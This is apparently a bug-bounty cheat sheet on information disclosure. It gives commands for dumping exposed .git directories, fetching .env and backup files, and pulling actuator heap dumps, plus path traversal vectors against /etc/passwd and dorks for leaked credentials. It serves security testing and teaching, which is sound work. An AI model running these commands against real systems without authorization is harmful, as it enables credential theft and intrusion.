# Information Disclosure
> Sources: Bug Bounty Bootcamp (Li), Real-World Bug Hunting (Yaworski), WSTG v4.2

## Categories

| Type | Examples |
|---|---|
| Technical info | Stack traces, server version, framework version |
| Credentials | API keys, passwords, tokens in source/config |
| Internal paths | File system paths, internal hostnames |
| Business data | User PII, financial data, internal docs |
| Source code | .git exposure, backup files, debug endpoints |

---

## Finding Information Disclosure

### 1. .git Directory Exposure

```bash
# Check if .git is accessible
curl -s https://target.com/.git/HEAD
# If returns "ref: refs/heads/main" → .git is exposed

# Tool: git-dumper
pip install git-dumper
git-dumper https://target.com/.git dumped_git/
cd dumped_git
git log --oneline
git show HEAD
git diff HEAD~1 HEAD

# Or manually:
curl https://target.com/.git/COMMIT_EDITMSG
curl https://target.com/.git/config
curl https://target.com/.git/index

# Search dumped code for secrets:
grep -r "password\|api_key\|secret\|token" dumped_git/
trufflehog --directory=dumped_git/
```

### 2. Source Code Backups

```bash
# Common backup file extensions
curl https://target.com/index.php~
curl https://target.com/index.php.bak
curl https://target.com/index.php.old
curl https://target.com/config.php.bak
curl https://target.com/.env
curl https://target.com/.env.backup
curl https://target.com/.env.production

# Automated
ffuf -w /opt/SecLists/Discovery/Web-Content/backup-extensions.txt \
  -u https://target.com/config.FUZZ
```

### 3. .env File Exposure

`.env` files often contain:
```
DB_PASSWORD=supersecret
AWS_ACCESS_KEY_ID=AKIAIOSFODNN7EXAMPLE
AWS_SECRET_ACCESS_KEY=wJalrXUtnFEMI/K7MDENG
STRIPE_SECRET_KEY=sk_live_...
```

```bash
for path in .env .env.local .env.production .env.backup .env.development; do
  curl -s https://target.com/$path | head -20
done
```

### 4. Wayback Machine & Historical Disclosure

```bash
waybackurls target.com | grep -E "\.(json|env|config|sql|log|bak)$"

# Look for API keys in old JS files
waybackurls target.com | grep "\.js$" | xargs -I{} curl -s {} | grep -E "api_key|apikey|secret"
```

### 5. Error Messages and Stack Traces

```bash
# Trigger errors to get information:
?id=INVALID
?id=9999999999999999999
?search=<script>
?page=../../../nonexistent

# Force 500 error:
Content-Type: application/json
{"key": }  # Invalid JSON → stack trace
```

### 6. API Documentation Leakage

```bash
/api/docs, /api/swagger, /swagger.json, /swagger.yaml
/openapi.json, /openapi.yaml, /api-docs, /v1/api-docs
/graphql, /graphql/console, /playground, /altair
```

### 7. Debug Endpoints

```bash
/debug, /console
/actuator            # Spring Boot
/actuator/env        # Environment variables
/actuator/health
/actuator/mappings
/actuator/beans
/__debug__           # Django
/_debugbar           # PHP DebugBar
/status, /info, /version, /server-info
```

### 8. Spring Boot Actuator Exposure (WSTG Special)

```bash
# If /actuator endpoints exposed:
/actuator/env       → Environment variables (contains credentials!)
/actuator/heapdump  → JVM heap dump (extract creds from memory)
/actuator/threaddump → Thread state
/actuator/beans     → All beans (architecture disclosure)
/actuator/mappings  → All URL routes
/actuator/loggers   → Change log levels

# Exploitation:
# POST /actuator/env {"name":"spring.datasource.url","value":"jdbc:h2:..."}
# Change loggers to enable debug → extract credentials from logs
# GET /actuator/heapdump → download heap dump → search for secrets
strings heapdump.hprof | grep -i "password\|secret\|token\|key"
```

### 9. JavaScript Source Analysis

```bash
# Find secrets in JS files
for js_url in $(gau target.com | grep "\.js$"); do
  curl -s $js_url | grep -E "(api_key|apikey|api_secret|access_key|secret_key|password|token)" -i
done

# Search for hardcoded endpoints
curl -s https://target.com/app.js | grep -E "https?://[a-z0-9.-]+" | grep -v "cdn\|fonts\|jquery"

# LinkFinder - extract endpoints
python3 linkfinder.py -i https://target.com -d
```

### 10. Response Headers Leakage

```bash
curl -sI https://target.com | grep -i "server\|x-powered-by\|x-aspnet-version\|x-generator"

# Interesting headers:
Server: Apache/2.4.49  → check for known CVEs
X-Powered-By: PHP/7.2.0
X-Generator: WordPress 5.8
X-AspNet-Version: 4.0.30319
```

### 11. Cloud Storage Misconfiguration

```bash
# AWS S3 — public access
aws s3 ls s3://bucket-name --no-sign-request
aws s3 cp s3://bucket-name/config.json /tmp/ --no-sign-request
aws s3api get-bucket-acl --bucket bucket-name --no-sign-request

# GCS
curl https://storage.googleapis.com/bucket-name/?list

# Azure Blob
curl https://storageaccount.blob.core.windows.net/containername/?restype=container&comp=list

# Common naming patterns
company-backups, company-logs, company-dev, company-secrets
company-uploads, company-static, company-terraform
```

### 12. GitHub/Code Repository Leakage

```bash
# Search GitHub for target's secrets
# github.com/search?q="example.com"+password+type:code

# TruffleHog on public repos
trufflehog github --org=TARGET_ORG --only-verified

# Gitrob
gitrob --github-access-token TOKEN TARGET_ORG
```

### 13. Google Dorks for Info Disclosure

```
site:target.com filetype:log
site:target.com filetype:sql
site:target.com filetype:env
site:target.com inurl:config
site:target.com "DB_PASSWORD"
site:target.com "BEGIN RSA PRIVATE KEY"
site:pastebin.com "target.com" password
```

### 14. Shodan for Config Exposure

```
shodan search "hostname:target.com port:27017"  # MongoDB
shodan search "hostname:target.com port:6379"   # Redis
shodan search "hostname:target.com port:9200"   # Elasticsearch
```

### 15. Path Traversal File Read

```bash
# In web apps reading files based on user input:
?page=../../../etc/passwd
?file=..%2F..%2F..%2Fetc%2Fpasswd
?template=....//....//....//etc/passwd

# WSTG-ATHZ-01 test vectors:
../../../etc/passwd
..\..\..\windows\win.ini
%2e%2e%2f%2e%2e%2f
..%252f..%252f (double URL encoding)
%c0%ae%c0%ae/ (overlong UTF-8)
```

---

## Sensitive Data Exfiltration Scenarios

```bash
# .env with database credentials:
DB_HOST=internal-db.target.com
DB_USER=app_user
DB_PASSWORD=SuperSecret123
→ Severity: High (database access)

# .env with AWS credentials:
AWS_ACCESS_KEY_ID=AKIA...
AWS_SECRET_ACCESS_KEY=...
→ Severity: Critical (cloud account compromise)
```

---

## Testing Checklist
- [ ] Check /.git/ for exposed repository
- [ ] Check /.env and common backup files
- [ ] Analyze JavaScript files for hardcoded secrets/endpoints
- [ ] Trigger error messages (SQL errors, exception traces)
- [ ] Check API documentation endpoints
- [ ] Check Spring Boot Actuator endpoints (/actuator/env, /actuator/heapdump)
- [ ] Google dork the target for public leaks
- [ ] Search GitHub for target's code/configs
- [ ] Check S3/GCS/Azure buckets for public access
- [ ] Review response headers for version disclosure
- [ ] Use Wayback Machine for historical data

## Severity
- **Informational**: Version numbers, server info
- **Low**: Internal file paths, tech stack info
- **Medium**: PII in error messages, API endpoint enumeration
- **High**: Database credentials, internal credentials
- **Critical**: AWS/cloud credentials, private keys, source code with hardcoded secrets
